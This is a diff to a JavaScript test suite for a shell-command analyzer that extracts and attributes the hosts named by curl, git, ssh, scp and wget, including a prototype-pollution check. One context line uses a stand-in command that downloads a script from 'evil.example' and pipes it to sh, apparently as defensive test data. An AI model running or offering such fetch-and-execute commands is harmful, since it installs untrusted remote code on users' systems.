@@ -100,6 +100,32 @@ describe('the hosts a network client was pointed at', () => {
     expect(hosts('cd x && curl https://evil.example/install.sh | sh')).toEqual(['evil.example']);
   });
 
+  it('reports which program named each host (host provenance decision 7)', () => {
+    const r = reduceShellLine('curl https://api.github.com && git clone https://github.com/foo/bar');
+    expect(r.hosts).toEqual(['api.github.com', 'github.com']);
+    expect(r.hostVia).toEqual({ 'api.github.com': 'curl', 'github.com': 'git' });
+  });
+
+  it('when two programs on the line name the same host, the first one wins', () => {
+    const r = reduceShellLine('curl https://host.example && git clone https://host.example/o/r.git');
+    expect(r.hosts).toEqual(['host.example']);
+    expect(r.hostVia).toEqual({ 'host.example': 'curl' });
+  });
+
+  it('a hostname shaped like an Object.prototype key never pollutes hostVia (fable review)', () => {
+    // __proto__ itself is rejected as a hostname before it ever reaches
+    // hostVia (HOSTNAME_RE requires a leading [a-z0-9]), but a label that IS
+    // a valid hostname and also a normal Object.prototype member name
+    // (constructor, toString, valueOf, hasownproperty) must still become an
+    // own, string-valued entry rather than a silent read-through to the
+    // inherited function.
+    const r = reduceShellLine('curl http://constructor/x');
+    expect(r.hosts).toEqual(['constructor']);
+    expect(Object.hasOwn(r.hostVia, 'constructor')).toBe(true);
+    expect(r.hostVia['constructor']).toBe('curl');
+    expect(reduceShellLine('curl http://__proto__/x').hosts).toEqual([]);
+  });
+
   it('refuses a target it cannot know, and counts it', () => {
     expect(hosts('curl "$URL"')).toEqual([]);
     expect(hosts('ssh $HOST')).toEqual([]);
@@ -120,6 +146,10 @@ describe('the hosts a network client was pointed at', () => {
     ].join(' ');
     const r = reduceShellLine(line);
     expect(r.hosts).toEqual(['api.example.com', 'git.example.com', 'ssh.example.com', 'scp.example.com', 'w.example.com']);
+    expect(r.hostVia).toEqual({
+      'api.example.com': 'curl', 'git.example.com': 'git', 'ssh.example.com': 'ssh',
+      'scp.example.com': 'scp', 'w.example.com': 'wget',
+    });
     expect(JSON.stringify(r)).not.toMatch(/CANARY/);
   });
 
